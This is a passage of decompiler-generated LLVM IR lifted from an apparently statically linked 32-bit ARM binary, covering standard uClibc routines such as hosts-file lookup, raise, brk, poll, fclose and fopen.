dec_label_pc_19c08:                               ; preds = %dec_label_pc_19bf4
  %v7_19c08 = icmp eq i32 %v0_19c08, 10
  br i1 %v7_19c08, label %dec_label_pc_19be0, label %dec_label_pc_19c10

dec_label_pc_19c10:                               ; preds = %dec_label_pc_19be0, %dec_label_pc_19c08, %dec_label_pc_19be8.preheader
  %v0_19c1434 = phi i32 [ %v0_19be820, %dec_label_pc_19be8.preheader ], [ %v5_19be4, %dec_label_pc_19be0 ], [ %v2_19be4, %dec_label_pc_19c08 ]
  %v0_19c10 = load i32, i32* @r8, align 4
  %v1_19c10 = add i32 %v0_19c10, 1
  br label %dec_label_pc_19c14

dec_label_pc_19c14:                               ; preds = %dec_label_pc_19b90, %dec_label_pc_19c10
  %storemerge = phi i32 [ %v1_19c10, %dec_label_pc_19c10 ], [ 0, %dec_label_pc_19b90 ]
  %v0_19ba8 = phi i32 [ %v0_19c1434, %dec_label_pc_19c10 ], [ %v0_19c1435, %dec_label_pc_19b90 ]
  store i32 %storemerge, i32* @r8, align 4
  %v1_19c14 = inttoptr i32 %v0_19ba8 to i8*
  %v2_19c14 = load i8, i8* %v1_19c14, align 1
  %v3_19c14 = zext i8 %v2_19c14 to i32
  %v2_19c18 = icmp eq i8 %v2_19c14, 0
  br i1 %v2_19c18, label %bb57, label %bb56

bb56:                                             ; preds = %dec_label_pc_19c14
  br label %bb57

bb57:                                             ; preds = %dec_label_pc_19c14, %bb56
  %v0_19c28.pr = phi i32 [ %v3_19c14, %dec_label_pc_19c14 ], [ 1, %bb56 ]
  %v1_19c20 = add i32 %storemerge, -4
  %v3_19c20 = sub i32 3, %storemerge
  %v4_19c20 = and i32 %v3_19c20, %storemerge
  %v5_19c20 = icmp slt i32 %v4_19c20, 0
  %v6_19c20 = icmp slt i32 %v1_19c20, 0
  %v7_19c20 = icmp eq i32 %storemerge, 4
  %v3_19c24 = xor i1 %v6_19c20, %v5_19c20
  %v4_19c24 = or i1 %v7_19c20, %v3_19c24
  br i1 %v4_19c24, label %bb58, label %.thread5

.thread5:                                         ; preds = %bb57
  br label %dec_label_pc_19c30

bb58:                                             ; preds = %bb57
  %v2_19c28 = icmp eq i32 %v0_19c28.pr, 0
  br i1 %v2_19c28, label %dec_label_pc_19c30, label %dec_label_pc_19ba0

dec_label_pc_19c30:                               ; preds = %bb58, %.thread5
  store i32 %tmp, i32* @r6, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_23008.1600 to i32), i32* @r1, align 4
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v4_19c3c = call i32 @__GI_strcoll(i8* %v3_19c3c, i32 ptrtoint ([11 x i8]* @global_var_23008.1600 to i32))
  store i32 %v4_19c3c, i32* %r0.global-to-local, align 4
  %v2_19c40 = icmp eq i32 %v4_19c3c, 0
  br i1 %v2_19c40, label %dec_label_pc_19c68.preheader, label %dec_label_pc_19c8c

dec_label_pc_19c68.preheader:                     ; preds = %dec_label_pc_19c30
  br label %dec_label_pc_19c68

dec_label_pc_19c50:                               ; preds = %dec_label_pc_19c80
  %v1_19c50 = add i32 %v5_19c70, -36
  %v2_19c50 = inttoptr i32 %v1_19c50 to i32*
  %v3_19c50 = load i32, i32* %v2_19c50, align 4
  store i32 %v3_19c50, i32* %r0.global-to-local, align 4
  %v1_19c54 = inttoptr i32 %v3_19c50 to i8*
  %v2_19c54 = call i32 @__GI_strdup(i8* %v1_19c54)
  store i32 %v2_19c54, i32* %r0.global-to-local, align 4
  %v0_19c5c = load i32, i32* @r4, align 4
  %v1_19c5c = add i32 %v0_19c5c, 1
  store i32 %v1_19c5c, i32* %r2.global-to-local, align 4
  %v5_19c60 = mul i32 %v0_19c5c, 4
  %v6_19c60 = add i32 %v5_19c60, ptrtoint (i32* @global_var_31900.1418 to i32)
  %v7_19c60 = inttoptr i32 %v6_19c60 to i32*
  store i32 %v2_19c54, i32* %v7_19c60, align 4
  %v0_19c64 = load i32, i32* %r2.global-to-local, align 4
  %v1_19c64 = load i32, i32* @r7, align 4
  %v2_19c64 = inttoptr i32 %v1_19c64 to i32*
  store i32 %v0_19c64, i32* %v2_19c64, align 4
  %v0_19c6c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_19c68

dec_label_pc_19c68:                               ; preds = %dec_label_pc_19c68.preheader, %dec_label_pc_19c50
  %v0_19c78 = phi i32 [ 1, %dec_label_pc_19c68.preheader ], [ %v0_19c6c.pre, %dec_label_pc_19c50 ]
  store i32 %v2_19ba0, i32* %r2.global-to-local, align 4
  %v1_19c6c = load i32, i32* @r8, align 4
  %v2_19c6c = sub i32 %v0_19c78, %v1_19c6c
  %v4_19c6c = xor i32 %v1_19c6c, %v0_19c78
  %v5_19c6c = xor i32 %v2_19c6c, %v0_19c78
  %v6_19c6c = and i32 %v5_19c6c, %v4_19c6c
  %v7_19c6c = icmp slt i32 %v6_19c6c, 0
  %v8_19c6c = icmp slt i32 %v2_19c6c, 0
  %v4_19c70 = mul i32 %v0_19c78, 4
  %v5_19c70 = add i32 %v4_19c70, %v2_19ba0
  store i32 ptrtoint (i32* @global_var_3190c.1415 to i32), i32* @r7, align 4
  %v1_19c78 = add i32 %v0_19c78, 1
  store i32 %v1_19c78, i32* @r5, align 4
  %v2_19c7c = xor i1 %v8_19c6c, %v7_19c6c
  br i1 %v2_19c7c, label %dec_label_pc_19c80, label %dec_label_pc_19c8c

dec_label_pc_19c80:                               ; preds = %dec_label_pc_19c68
  %v2_19c80 = load i32, i32* @global_var_3190c.1415, align 4
  store i32 %v2_19c80, i32* @r4, align 4
  %v7_19c88 = icmp slt i32 %v2_19c80, 3
  br i1 %v7_19c88, label %dec_label_pc_19c50, label %dec_label_pc_19c8c

dec_label_pc_19c8c:                               ; preds = %dec_label_pc_19c68, %dec_label_pc_19c80, %dec_label_pc_19c30
  %v0_19c8c = load i32, i32* @r6, align 4
  store i32 %v0_19c8c, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_23014.1603 to i32), i32* @r1, align 4
  %v3_19c94 = inttoptr i32 %v0_19c8c to i8*
  %v4_19c94 = call i32 @__GI_strcoll(i8* %v3_19c94, i32 ptrtoint ([7 x i8]* @global_var_23014.1603 to i32))
  store i32 %v4_19c94, i32* %r0.global-to-local, align 4
  %v2_19c98 = icmp eq i32 %v4_19c94, 0
  br i1 %v2_19c98, label %dec_label_pc_19cd0.preheader, label %dec_label_pc_19ca0

dec_label_pc_19ca0:                               ; preds = %dec_label_pc_19c8c
  %v0_19ca0 = load i32, i32* @r6, align 4
  store i32 %v0_19ca0, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_2301c.1605 to i32), i32* @r1, align 4
  %v3_19ca8 = inttoptr i32 %v0_19ca0 to i8*
  %v4_19ca8 = call i32 @__GI_strcoll(i8* %v3_19ca8, i32 ptrtoint ([7 x i8]* @global_var_2301c.1605 to i32))
  store i32 %v4_19ca8, i32* %r0.global-to-local, align 4
  %v2_19cac = icmp eq i32 %v4_19ca8, 0
  br i1 %v2_19cac, label %dec_label_pc_19cd0.preheader, label %dec_label_pc_19d2c.backedge

dec_label_pc_19cd0.preheader:                     ; preds = %dec_label_pc_19c8c, %dec_label_pc_19ca0
  store i32 ptrtoint (i32* @global_var_31910.1579 to i32), i32* @r4, align 4
  %v2_19cd460 = load i32, i32* @global_var_31910.1579, align 4
  store i32 ptrtoint (i32* @global_var_318f0.1583 to i32), i32* @r5, align 4
  %v1_19ce063 = add i32 %v2_19cd460, -1
  store i32 %v1_19ce063, i32* %r2.global-to-local, align 4
  %tmp5964 = icmp slt i32 %v2_19cd460, 1
  br i1 %tmp5964, label %dec_label_pc_19ce8, label %dec_label_pc_19cb8

dec_label_pc_19cb8:                               ; preds = %dec_label_pc_19cd0.preheader, %dec_label_pc_19cb8
  %v1_19ce065 = phi i32 [ %v1_19ce0, %dec_label_pc_19cb8 ], [ %v1_19ce063, %dec_label_pc_19cd0.preheader ]
  %v4_19cb8 = mul i32 %v1_19ce065, 4
  %v5_19cb8 = add i32 %v4_19cb8, ptrtoint (i32* @global_var_318f0.1583 to i32)
  %v6_19cb8 = inttoptr i32 %v5_19cb8 to i32*
  %v7_19cb8 = load i32, i32* %v6_19cb8, align 4
  store i32 %v7_19cb8, i32* %r0.global-to-local, align 4
  store i32 %v1_19ce065, i32* @global_var_31910.1579, align 4
  %v1_19cc0 = call i32 @free(i32 %v7_19cb8)
  store i32 %v1_19cc0, i32* %r0.global-to-local, align 4
  %v0_19cc4 = load i32, i32* @r4, align 4
  %v1_19cc4 = inttoptr i32 %v0_19cc4 to i32*
  %v2_19cc4 = load i32, i32* %v1_19cc4, align 4
  %v1_19ccc = load i32, i32* @r5, align 4
  %v5_19ccc = mul i32 %v2_19cc4, 4
  %v6_19ccc = add i32 %v1_19ccc, %v5_19ccc
  %v7_19ccc = inttoptr i32 %v6_19ccc to i32*
  store i32 0, i32* %v7_19ccc, align 4
  store i32 ptrtoint (i32* @global_var_31910.1579 to i32), i32* @r4, align 4
  %v2_19cd4 = load i32, i32* @global_var_31910.1579, align 4
  store i32 ptrtoint (i32* @global_var_318f0.1583 to i32), i32* @r5, align 4
  %v1_19ce0 = add i32 %v2_19cd4, -1
  store i32 %v1_19ce0, i32* %r2.global-to-local, align 4
  %tmp59 = icmp slt i32 %v2_19cd4, 1
  br i1 %tmp59, label %dec_label_pc_19ce8, label %dec_label_pc_19cb8

dec_label_pc_19ce8:                               ; preds = %dec_label_pc_19cb8, %dec_label_pc_19cd0.preheader
  br label %dec_label_pc_19d08

dec_label_pc_19cf0:                               ; preds = %dec_label_pc_19d20
  %v1_19cf0 = add i32 %v5_19d10, -36
  %v2_19cf0 = inttoptr i32 %v1_19cf0 to i32*
  %v3_19cf0 = load i32, i32* %v2_19cf0, align 4
  store i32 %v3_19cf0, i32* %r0.global-to-local, align 4
  %v1_19cf4 = inttoptr i32 %v3_19cf0 to i8*
  %v2_19cf4 = call i32 @__GI_strdup(i8* %v1_19cf4)
  store i32 %v2_19cf4, i32* %r0.global-to-local, align 4
  %v0_19cfc = load i32, i32* @r4, align 4
  %v1_19cfc = add i32 %v0_19cfc, 1
  store i32 %v1_19cfc, i32* %r2.global-to-local, align 4
  %v5_19d00 = mul i32 %v0_19cfc, 4
  %v6_19d00 = add i32 %v5_19d00, ptrtoint (i32* @global_var_318f0.1583 to i32)
  %v7_19d00 = inttoptr i32 %v6_19d00 to i32*
  store i32 %v2_19cf4, i32* %v7_19d00, align 4
  %v0_19d04 = load i32, i32* %r2.global-to-local, align 4
  %v1_19d04 = load i32, i32* @r6, align 4
  %v2_19d04 = inttoptr i32 %v1_19d04 to i32*
  store i32 %v0_19d04, i32* %v2_19d04, align 4
  %v0_19d0c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_19d08

dec_label_pc_19d08:                               ; preds = %dec_label_pc_19ce8, %dec_label_pc_19cf0
  %v0_19d18 = phi i32 [ 1, %dec_label_pc_19ce8 ], [ %v0_19d0c.pre, %dec_label_pc_19cf0 ]
  store i32 %v2_19ba0, i32* %r2.global-to-local, align 4
  %v1_19d0c = load i32, i32* @r8, align 4
  %v2_19d0c = sub i32 %v0_19d18, %v1_19d0c
  %v4_19d0c = xor i32 %v1_19d0c, %v0_19d18
  %v5_19d0c = xor i32 %v2_19d0c, %v0_19d18
  %v6_19d0c = and i32 %v5_19d0c, %v4_19d0c
  %v7_19d0c = icmp slt i32 %v6_19d0c, 0
  %v8_19d0c = icmp slt i32 %v2_19d0c, 0
  %v4_19d10 = mul i32 %v0_19d18, 4
  %v5_19d10 = add i32 %v4_19d10, %v2_19ba0
  store i32 ptrtoint (i32* @global_var_31910.1579 to i32), i32* @r6, align 4
  %v1_19d18 = add i32 %v0_19d18, 1
  store i32 %v1_19d18, i32* @r5, align 4
  %v2_19d1c = xor i1 %v8_19d0c, %v7_19d0c
  br i1 %v2_19d1c, label %dec_label_pc_19d20, label %dec_label_pc_19d2c.backedge

dec_label_pc_19d20:                               ; preds = %dec_label_pc_19d08
  %v2_19d20 = load i32, i32* @global_var_31910.1579, align 4
  store i32 %v2_19d20, i32* @r4, align 4
  %v7_19d28 = icmp slt i32 %v2_19d20, 4
  br i1 %v7_19d28, label %dec_label_pc_19cf0, label %dec_label_pc_19d2c.backedge

dec_label_pc_19b5c.preheader:                     ; preds = %dec_label_pc_19b5c.preheader.lr.ph, %dec_label_pc_19d2c.backedge
  store i32 %v2_19af0, i32* %r0.global-to-local, align 4
  %v2_19b5c12 = load i8, i8* %v1_19b5c11, align 4
  %v3_19b5c13 = zext i8 %v2_19b5c12 to i32
  store i32 %v3_19b5c13, i32* %r2.global-to-local, align 4
  %v2_19b6014 = icmp eq i8 %v2_19b5c12, 0
  br i1 %v2_19b6014, label %dec_label_pc_19b7c, label %dec_label_pc_19b68.lr.ph

dec_label_pc_19b68.lr.ph:                         ; preds = %dec_label_pc_19b5c.preheader
  %v2_19b6c.pre = load i32, i32* @global_var_2b254, align 4
  br label %dec_label_pc_19b68

dec_label_pc_19d4c:                               ; preds = %dec_label_pc_19d2c.backedge, %dec_label_pc_19d2c.preheader
  %v0_19d4c = load i32, i32* @sl, align 4
  store i32 %v0_19d4c, i32* %r0.global-to-local, align 4
  %v1_19d50 = inttoptr i32 %v0_19d4c to i8*
  %v2_19d50 = call i32 @__GI_fclose(i8* %v1_19d50)
  store i32 %v2_19d50, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_19d64

dec_label_pc_19d58:                               ; preds = %dec_label_pc_19b40
  %v0_19d58 = call i32 @__GI___h_errno_location()
  store i32 %v0_19d58, i32* %r0.global-to-local, align 4
  %v2_19d60 = inttoptr i32 %v0_19d58 to i32*
  store i32 3, i32* %v2_19d60, align 4
  br label %dec_label_pc_19d64

dec_label_pc_19d64:                               ; preds = %entry, %dec_label_pc_19d4c, %dec_label_pc_19d58
  store i32 %v2_19af4, i32* @r0, align 4
  %v1_19d74 = call i32 @__pthread_return_void()
  store i32 %v1_19d74, i32* %r0.global-to-local, align 4
  store i32 %v6_19aec, i32* @r5, align 4
  store i32 %v9_19aec, i32* @r6, align 4
  store i32 %v12_19aec, i32* @r7, align 4
  store i32 %v15_19aec, i32* @r8, align 4
  store i32 %v18_19aec, i32* @sl, align 4
  ret i32 %v1_19d74

; uselistorder directives
  uselistorder i32 %v3_19b5c13, { 2, 1, 0 }
  uselistorder i32 %v2_19d0c, { 1, 0 }
  uselistorder i32 %v0_19d18, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v1_19ce0, { 1, 0 }
  uselistorder i32 %v1_19ce065, { 1, 0 }
  uselistorder i32 %v2_19c6c, { 1, 0 }
  uselistorder i32 %v0_19c78, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v0_19ba8, { 1, 0 }
  uselistorder i32 %storemerge, { 3, 0, 1, 2, 5, 4 }
  uselistorder i32 %v0_19be820, { 1, 0, 2 }
  uselistorder i32 %v2_19ba0, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 %v2_19af0, { 5, 6, 8, 7, 3, 4, 0, 1, 2 }
  uselistorder i32* %stack_var_-28, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r2.global-to-local, { 0, 7, 5, 6, 8, 3, 11, 9, 10, 12, 2, 13, 1, 14, 16, 15, 4, 17 }
  uselistorder i32* %r0.global-to-local, { 0, 4, 6, 5, 23, 8, 7, 10, 9, 12, 11, 14, 13, 16, 15, 24, 17, 18, 22, 19, 21, 26, 25, 20, 3, 2, 27, 29, 1, 28 }
  uselistorder i32 ()* @__GI___h_errno_location, { 5, 4, 3, 2, 6, 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_318f0.1583 to i32), { 3, 5, 1, 0, 4, 2 }
  uselistorder i32* @global_var_31910.1579, { 2, 3, 1, 0, 7, 4, 5, 6 }
  uselistorder i32 ptrtoint (i32* @global_var_31910.1579 to i32), { 1, 2, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_31900.1418 to i32), { 1, 0, 2 }
  uselistorder i32* @global_var_3190c.1415, { 0, 3, 1, 2 }
  uselistorder label %dec_label_pc_19d64, { 2, 1, 0 }
  uselistorder label %dec_label_pc_19b5c.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_19d08, { 1, 0 }
  uselistorder label %dec_label_pc_19cb8, { 1, 0 }
  uselistorder label %dec_label_pc_19cd0.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_19c8c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_19c68, { 1, 0 }
  uselistorder label %bb57, { 1, 0 }
  uselistorder label %dec_label_pc_19c14, { 1, 0 }
  uselistorder label %dec_label_pc_19c10, { 1, 0, 2 }
  uselistorder label %dec_label_pc_19bf4, { 1, 0 }
  uselistorder label %dec_label_pc_19be0, { 1, 0 }
  uselistorder label %dec_label_pc_19bc0, { 1, 0 }
  uselistorder label %dec_label_pc_19d2c.backedge, { 1, 0, 3, 5, 2, 4 }
  uselistorder label %dec_label_pc_19b7c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_19d2c.preheader, { 1, 0 }
}

define i32 @__get_hosts_byname_r(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @lr, align 4
  store i32 %arg1, i32* @r1, align 4
  store i32 0, i32* @r0, align 4
  store i32 %arg2, i32* @r2, align 4
  store i32 0, i32* @r3, align 4
  %v0_19dfc = call i32 @__read_etc_hosts_r()
  ret i32 %v0_19dfc
}

define i32 @__raise(i32 %arg1) local_unnamed_addr {
entry:
  %v3_19e08 = load i32, i32* @r4, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_19e10 = call i32 @__libc_getpid()
  store i32 %v3_19e08, i32* @r4, align 4
  %v0_19e1c = call i32 @kill()
  ret i32 %v0_19e1c

; uselistorder directives
  uselistorder i32 ()* @kill, { 2, 3, 1, 0 }
  uselistorder i32 ()* @__libc_getpid, { 0, 3, 2, 1 }
}

define i32 @_dl_aux_init(i32 %arg1) local_unnamed_addr {
entry:
  %v1_19e20 = add i32 %arg1, 28
  %v2_19e20 = inttoptr i32 %v1_19e20 to i32*
  %v3_19e20 = load i32, i32* %v2_19e20, align 4
  %v1_19e28 = add i32 %arg1, 44
  %v2_19e28 = inttoptr i32 %v1_19e28 to i32*
  %v3_19e28 = load i32, i32* %v2_19e28, align 4
  store i32 %v3_19e20, i32* @global_var_31914.1610, align 4
  store i32 %v3_19e28, i32* @global_var_31918.1612, align 4
  ret i32 %arg1
}

define i32 @__GI_brk(i32* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %v2_19e4c = call i32 @brk(i32* %arg1)
  %v3_19e50 = icmp ult i32 %v2_19e4c, %tmp
  store i32 %v2_19e4c, i32* @global_var_31844.1542, align 4
  br i1 %v3_19e50, label %dec_label_pc_19e64, label %dec_label_pc_19e74

dec_label_pc_19e64:                               ; preds = %entry
  %v0_19e64 = call i32 @__errno_location()
  %v2_19e6c = inttoptr i32 %v0_19e64 to i32*
  store i32 12, i32* %v2_19e6c, align 4
  br label %dec_label_pc_19e74

dec_label_pc_19e74:                               ; preds = %entry, %dec_label_pc_19e64
  %v0_19e74 = phi i32 [ 0, %entry ], [ -1, %dec_label_pc_19e64 ]
  ret i32 %v0_19e74

; uselistorder directives
  uselistorder i32* @global_var_31844.1542, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_19e74, { 1, 0 }
}

define i32 @__libc_poll(%pollfd* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_19e80 = load i32, i32* @r4, align 4
  store i32 %v3_19e80, i32* %stack_var_-8, align 4
  %v5_19e84 = call i32 @poll(%pollfd* %arg1, i32 %arg2, i32 %arg3)
  store i32 %v5_19e84, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_19e84, -4095
  br i1 %tmp, label %dec_label_pc_19ea4, label %dec_label_pc_19e94

dec_label_pc_19e94:                               ; preds = %entry
  %v0_19e94 = call i32 @__errno_location()
  %v0_19e98 = load i32, i32* %r4.global-to-local, align 4
  %v1_19e98 = sub i32 0, %v0_19e98
  %v2_19e9c = inttoptr i32 %v0_19e94 to i32*
  store i32 %v1_19e98, i32* %v2_19e9c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_19ea4

dec_label_pc_19ea4:                               ; preds = %entry, %dec_label_pc_19e94
  %v0_19ea4 = phi i32 [ %v5_19e84, %entry ], [ -1, %dec_label_pc_19e94 ]
  %v2_19ea8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_19ea8, i32* @r4, align 4
  ret i32 %v0_19ea4

; uselistorder directives
  uselistorder i32 %v5_19e84, { 1, 0, 2 }
  uselistorder label %dec_label_pc_19ea4, { 1, 0 }
}

define i32 @__GI_fclose(i8* %arg1) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %v2_19eb0 = add i32 %tmp, 52
  %v3_19eb0 = inttoptr i32 %v2_19eb0 to i32*
  %v4_19eb0 = load i32, i32* %v3_19eb0, align 4
  store i32 %v4_19eb0, i32* @r8, align 4
  %v2_19eb4 = add i32 %tmp, 56
  store i32 %v2_19eb4, i32* @r5, align 4
  %v2_19eb8 = ptrtoint i32* %stack_var_-64 to i32
  %v2_19ebc = icmp eq i32 %v4_19eb0, 0
  store i1 %v2_19ebc, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* @r4, align 4
  %v2_19ecc = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_19ecc, i32* @r0, align 4
  br i1 %v2_19ebc, label %dec_label_pc_19ed4, label %dec_label_pc_19ef0

dec_label_pc_19ed4:                               ; preds = %entry
  store i32 95968, i32* %r3.global-to-local, align 4
  %v1_19edc = call i32 @__pthread_return_void()
  store i32 ptrtoint (i8* @global_var_176d8.1331 to i32), i32* %r3.global-to-local, align 4
  %v1_19eec = call i32 @__pthread_return_0()
  %v0_19ef0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_19ef0

dec_label_pc_19ef0:                               ; preds = %entry, %dec_label_pc_19ed4
  %v0_19ef8 = phi i32 [ %tmp, %entry ], [ %v0_19ef0.pre, %dec_label_pc_19ed4 ]
  %v1_19ef0 = inttoptr i32 %v0_19ef8 to i8*
  %v2_19ef0 = load i8, i8* %v1_19ef0, align 1
  %v3_19ef0 = zext i8 %v2_19ef0 to i32
  %v1_19ef4 = and i32 %v3_19ef0, 64
  store i32 %v1_19ef4, i32* %r3.global-to-local, align 4
  %v2_19ef4 = icmp eq i32 %v1_19ef4, 0
  store i1 %v2_19ef4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_19ef4, i32* @r7, align 4
  br i1 %v2_19ef4, label %dec_label_pc_19f0c, label %dec_label_pc_19f04

dec_label_pc_19f04:                               ; preds = %dec_label_pc_19ef0
  %v3_19f04 = call i32 @fflush_unlocked(i8* %v1_19ef0)
  store i32 %v3_19f04, i32* @r7, align 4
  %v0_19f0c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_19f0c

dec_label_pc_19f0c:                               ; preds = %dec_label_pc_19ef0, %dec_label_pc_19f04
  %v0_19f0c = phi i32 [ %v0_19ef8, %dec_label_pc_19ef0 ], [ %v0_19f0c.pre, %dec_label_pc_19f04 ]
  %v1_19f0c = add i32 %v0_19f0c, 4
  %v2_19f0c = inttoptr i32 %v1_19f0c to i32*
  %v3_19f0c = load i32, i32* %v2_19f0c, align 4
  %v1_19f10 = call i32 @__libc_close(i32 %v3_19f0c)
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_19f18 = icmp slt i32 %v1_19f10, 0
  %v2_19f18 = icmp eq i32 %v1_19f10, 0
  store i1 %v2_19f18, i1* %cpsr_z.global-to-local, align 1
  %v1_19f1c = load i32, i32* @r4, align 4
  %v2_19f1c = add i32 %v1_19f1c, 4
  %v3_19f1c = inttoptr i32 %v2_19f1c to i32*
  store i32 -1, i32* %v3_19f1c, align 4
  store i32 %v2_19eb8, i32* @r0, align 4
  br i1 %v1_19f18, label %bb, label %bb15

bb:                                               ; preds = %dec_label_pc_19f0c
  %v3_19f30 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v3_19f30, i32* @r7, align 4
  br label %bb15

bb15:                                             ; preds = %dec_label_pc_19f0c, %bb
  %v1_19f3c = call i32 @__pthread_return_void()
  %v1_19f48 = call i32 @__pthread_return_0()
  %v2_19f50 = load i32, i32* @global_var_2f5ec.1619, align 4
  %v1_19f54 = add i32 %v2_19f50, 1
  store i32 %v1_19f54, i32* %r3.global-to-local, align 4
  store i32 %v1_19f54, i32* @global_var_2f5ec.1619, align 4
  store i32 %v2_19eb8, i32* @r0, align 4
  %v1_19f6c = call i32 @__pthread_return_void()
  %v0_19f70 = load i32, i32* @r4, align 4
  %v1_19f70 = inttoptr i32 %v0_19f70 to i32*
  %v2_19f70 = load i32, i32* %v1_19f70, align 4
  %v1_19f74 = and i32 %v2_19f70, 24576
  store i32 %v1_19f74, i32* %r3.global-to-local, align 4
  %v3_19f781 = udiv i32 %v1_19f74, 256
  %v1_19f7c = trunc i32 %v3_19f781 to i8
  %v3_19f7c = add i32 %v0_19f70, 1
  %v4_19f7c = inttoptr i32 %v3_19f7c to i8*
  store i8 %v1_19f7c, i8* %v4_19f7c, align 1
  %v0_19f80 = load i32, i32* %r3.global-to-local, align 4
  %v1_19f80 = trunc i32 %v0_19f80 to i8
  %v2_19f80 = load i32, i32* @r4, align 4
  %v3_19f80 = inttoptr i32 %v2_19f80 to i8*
  store i8 %v1_19f80, i8* %v3_19f80, align 1
  %v0_19f84 = load i32, i32* @r4, align 4
  %v1_19f84 = inttoptr i32 %v0_19f84 to i32*
  %v2_19f84 = load i32, i32* %v1_19f84, align 4
  %v1_19f88 = or i32 %v2_19f84, 48
  store i32 %v1_19f88, i32* %r3.global-to-local, align 4
  %v3_19f8c = sdiv i32 %v2_19f84, 256
  %v0_19f90 = load i32, i32* @r8, align 4
  %v2_19f90 = icmp eq i32 %v0_19f90, 0
  store i1 %v2_19f90, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_19ecc, i32* @r0, align 4
  %v1_19fa0 = trunc i32 %v3_19f8c to i8
  %v3_19fa0 = add i32 %v0_19f84, 1
  %v4_19fa0 = inttoptr i32 %v3_19fa0 to i8*
  store i8 %v1_19fa0, i8* %v4_19fa0, align 1
  %v0_19fa4 = load i32, i32* %r3.global-to-local, align 4
  %v1_19fa4 = trunc i32 %v0_19fa4 to i8
  %v2_19fa4 = load i32, i32* @r4, align 4
  %v3_19fa4 = inttoptr i32 %v2_19fa4 to i8*
  store i8 %v1_19fa4, i8* %v3_19fa4, align 1
  %v0_19fa8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_19fa8, label %bb16, label %.thread

bb16:                                             ; preds = %bb15
  %v2_19fac = call i32 @__pthread_return_void()
  br label %.thread

.thread:                                          ; preds = %bb15, %bb16
  %v0_19fb0 = load i32, i32* @r4, align 4
  %v1_19fb0 = add i32 %v0_19fb0, 1
  %v2_19fb0 = inttoptr i32 %v1_19fb0 to i8*
  %v3_19fb0 = load i8, i8* %v2_19fb0, align 1
  %v4_19fb0 = zext i8 %v3_19fb0 to i32
  store i32 %v4_19fb0, i32* %r3.global-to-local, align 4
  %v1_19fb4 = and i32 %v4_19fb0, 64
  %v2_19fb4 = icmp eq i32 %v1_19fb4, 0
  store i1 %v2_19fb4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19fb4, label %bb18, label %bb17

bb17:                                             ; preds = %.thread
  br label %bb18

bb18:                                             ; preds = %.thread, %bb17
  %v1_19fbc = xor i1 %v2_19fb4, true
  call void @__pseudo_cond_branch(i1 %v1_19fbc, i32 ptrtoint (i32* @global_var_167c4.1585 to i32))
  store i32 %v2_19eb8, i32* @r0, align 4
  %v1_19fd0 = call i32 @__pthread_return_void()
  %v1_19fdc = call i32 @__pthread_return_0()
  %v2_19fe4 = load i32, i32* @global_var_2f5f0.1623, align 4
  %v1_19fe8 = add i32 %v2_19fe4, 1
  store i32 %v1_19fe8, i32* %r3.global-to-local, align 4
  store i32 %v2_19eb8, i32* @r0, align 4
  store i32 %v1_19fe8, i32* @global_var_2f5f0.1623, align 4
  %v1_19ffc = call i32 @__pthread_return_void()
  %v1_1a000 = call i32 @_stdio_openlist_dec_use(i32 %v1_19ffc)
  %v0_1a004 = load i32, i32* @r7, align 4
  ret i32 %v0_1a004

; uselistorder directives
  uselistorder i32 %tmp, { 0, 1, 3, 2 }
  uselistorder i32 (i32)* @__libc_close, { 15, 14, 31, 30, 29, 13, 12, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 11, 1, 0, 10, 9, 8, 7, 6, 5, 4, 3, 2 }
  uselistorder label %bb18, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %bb15, { 1, 0 }
  uselistorder label %dec_label_pc_19f0c, { 1, 0 }
  uselistorder label %dec_label_pc_19ef0, { 1, 0 }
}

define i32 @__GI_fopen(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 0, i32* @r2, align 4
  store i32 -1, i32* @r3, align 4
  %v0_1a034 = call i32 @_stdio_fopen()
  ret i32 %v0_1a034
}

